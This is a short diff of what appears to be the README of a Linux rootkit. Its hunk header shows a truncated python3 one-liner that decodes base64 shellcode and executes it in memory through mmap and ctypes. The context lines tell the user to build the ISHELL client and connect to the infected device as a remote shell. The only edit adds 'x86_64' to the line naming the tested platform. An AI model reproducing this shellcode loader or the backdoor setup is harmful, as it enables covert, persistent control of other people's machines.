@@ -13,4 +13,4 @@ python3 -c 'import base64, mmap, ctypes; encoded_shellcode = "SDHJSIHp9////0iNBe
 
 From there you may go into the ISHELL-v0.3 folder and type 'make linux' to build ish. Then you may run ish with the ip of the device the rootkit was ran on to connect.
 
-Currently tested on Debian Trixie. 
+Currently tested on x86_64 Debian Trixie. 
